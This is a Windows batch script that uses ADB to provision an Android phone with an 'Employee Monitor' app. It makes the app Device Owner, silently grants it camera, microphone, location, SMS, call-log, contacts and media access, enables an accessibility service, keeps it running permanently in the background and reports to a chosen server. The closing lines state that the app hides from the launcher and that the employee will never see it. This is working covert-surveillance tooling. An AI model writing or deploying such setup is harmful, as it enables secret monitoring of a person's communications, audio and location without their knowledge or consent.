@echo off
echo ==========================================
echo   Employee Monitor - Phone Setup Script
echo ==========================================
echo.
echo This script provisions a company-owned phone
echo for zero-touch employee monitoring.
echo.
echo PREREQUISITES:
echo   1. Phone factory reset and connected via USB
echo   2. USB Debugging enabled
echo   3. Phone on initial setup screen (or home screen)
echo.

:: Step 1: Check ADB
echo [1/8] Checking ADB...
where adb >nul 2>nul
if %ERRORLEVEL% neq 0 (
    echo [ERROR] ADB not found in PATH.
    echo Install Android SDK Platform Tools:
    echo   https://developer.android.com/studio/releases/platform-tools
    echo.
    echo Or add to PATH:
    echo   set PATH=%PATH%;C:\Users\%USERNAME%\AppData\Local\Android\Sdk\platform-tools
    pause
    exit /b 1
)
echo   ADB found.

:: Step 2: Check device connection
echo.
echo [2/8] Checking device connection...
adb devices | findstr /r "device$" >nul 2>nul
if %ERRORLEVEL% neq 0 (
    echo [ERROR] No device found.
    echo.
    echo Make sure:
    echo   1. Phone is connected via USB
    echo   2. USB Debugging is enabled
    echo   3. You tapped "Allow" on the phone
    echo.
    adb devices
    pause
    exit /b 1
)
echo   Device connected.

:: Step 3: Get server IP
echo.
echo [3/8] Configuring server address...
echo.
echo Enter your server IP address.
echo This is your PC's Tailscale IP (100.x.x.x) or local IP.
echo.
set /p SERVER_IP="Server IP (e.g., 100.64.0.1): "

if "%SERVER_IP%"=="" (
    echo [ERROR] No IP entered.
    pause
    exit /b 1
)
echo   Server: http://%SERVER_IP%:3000

:: Step 4: Set Device Owner (if not already)
echo.
echo [4/8] Setting Device Owner...
adb shell dpm set-device-owner com.employeemonitor/.AdminReceiver 2>nul
if %ERRORLEVEL% neq 0 (
    echo   [INFO] Device Owner may already be set or device needs factory reset.
    echo   If phone is freshly reset, this should work.
    echo   If not, factory reset the phone and try again.
) else (
    echo   Device Owner set successfully.
)

:: Step 5: Install APK
echo.
echo [5/8] Installing APK...
if exist "EmployeeMonitor-debug.apk" (
    adb install -r -g EmployeeMonitor-debug.apk
    if %ERRORLEVEL% neq 0 (
        echo [ERROR] APK installation failed.
        pause
        exit /b 1
    )
    echo   APK installed.
) else (
    echo [WARNING] EmployeeMonitor-debug.apk not found in current directory.
    echo   Make sure the APK is in the same folder as this script.
    echo   Continuing with existing installation...
)

:: Step 6: Grant permissions silently
echo.
echo [6/8] Granting permissions silently...

adb shell pm grant com.employeemonitor android.permission.CAMERA 2>nul
adb shell pm grant com.employeemonitor android.permission.RECORD_AUDIO 2>nul
adb shell pm grant com.employeemonitor android.permission.ACCESS_FINE_LOCATION 2>nul
adb shell pm grant com.employeemonitor android.permission.ACCESS_COARSE_LOCATION 2>nul
adb shell pm grant com.employeemonitor android.permission.READ_PHONE_STATE 2>nul
adb shell pm grant com.employeemonitor android.permission.READ_SMS 2>nul
adb shell pm grant com.employeemonitor android.permission.READ_CALL_LOG 2>nul
adb shell pm grant com.employeemonitor android.permission.READ_CONTACTS 2>nul
adb shell pm grant com.employeemonitor android.permission.GET_ACCOUNTS 2>nul
adb shell pm grant com.employeemonitor android.permission.SEND_SMS 2>nul
adb shell pm grant com.employeemonitor android.permission.CALL_PHONE 2>nul
adb shell pm grant com.employeemonitor android.permission.PROCESS_OUTGOING_CALLS 2>nul
adb shell pm grant com.employeemonitor android.permission.WRITE_EXTERNAL_STORAGE 2>nul
adb shell pm grant com.employeemonitor android.permission.READ_EXTERNAL_STORAGE 2>nul
adb shell pm grant com.employeemonitor android.permission.POST_NOTIFICATIONS 2>nul
adb shell pm grant com.employeemonitor android.permission.READ_MEDIA_IMAGES 2>nul
adb shell pm grant com.employeemonitor android.permission.READ_MEDIA_VIDEO 2>nul
adb shell pm grant com.employeemonitor android.permission.READ_MEDIA_AUDIO 2>nul
adb shell pm grant com.employeemonitor android.permission.WRITE_MEDIA_IMAGES 2>nul
adb shell pm grant com.employeemonitor android.permission.WRITE_MEDIA_VIDEO 2>nul
adb shell pm grant com.employeemonitor android.permission.WRITE_MEDIA_AUDIO 2>nul
adb shell pm grant com.employeemonitor android.permission.MODIFY_AUDIO_SETTINGS 2>nul
adb shell pm grant com.employeemonitor android.permission.BLUETOOTH 2>nul
adb shell pm grant com.employeemonitor android.permission.BLUETOOTH_CONNECT 2>nul

echo   Permissions granted.

:: Step 7: Enable accessibility service
echo.
echo [7/8] Enabling accessibility service...
adb shell settings put secure enabled_accessibility_services com.employeemonitor/.ForegroundService 2>nul
adb shell settings put secure accessibility_enabled 1 2>nul
echo   Accessibility service enabled.

:: Step 8: Grant special permissions
echo.
echo [8/8] Granting special permissions...
adb shell appops set com.employeemonitor SYSTEM_ALERT_WINDOW allow 2>nul
adb shell appops set com.employeemonitor GET_USAGE_STATS allow 2>nul
adb shell appops set com.employeemonitor RUN_IN_BACKGROUND allow 2>nul
adb shell appops set com.employeemonitor RUN_ANY_IN_BACKGROUND allow 2>nul
adb shell appops set com.employeemonitor MANAGE_EXTERNAL_STORAGE allow 2>nul
adb shell appops set com.employeemonitor READ_MEDIA_IMAGES allow 2>nul
adb shell appops set com.employeemonitor READ_MEDIA_VIDEO allow 2>nul
adb shell appops set com.employeemonitor READ_MEDIA_AUDIO allow 2>nul
echo   Special permissions granted.

:: Configure server URL
echo.
echo Configuring server URL...
adb shell am start -n com.employeemonitor/.MainActivity --es server_url "http://%SERVER_IP%:3000" 2>nul

:: Disable battery optimization
echo Disabling battery optimization...
adb shell dumpsys deviceidle whitelist +com.employeemonitor 2>nul

echo.
echo ==========================================
echo   SETUP COMPLETE
echo ==========================================
echo.
echo   Server: http://%SERVER_IP%:3000
echo   App: com.employeemonitor
echo.
echo   The phone is now configured for zero-touch
echo   employee monitoring. The app will:
echo.
echo   - Auto-start on boot
echo   - Auto-restart if killed
echo   - Run in background permanently
echo   - Hide from launcher (Device Owner)
echo.
echo   Give the phone to the employee.
echo   They will never see or interact with the app.
echo.
echo ==========================================
echo.

:: Launch the app to complete setup
echo Launching app for initial setup...
adb shell am start -n com.employeemonitor/.MainActivity
timeout /t 3 /nobreak >nul

echo.
echo Setup finished. Press any key to exit.
pause >nul
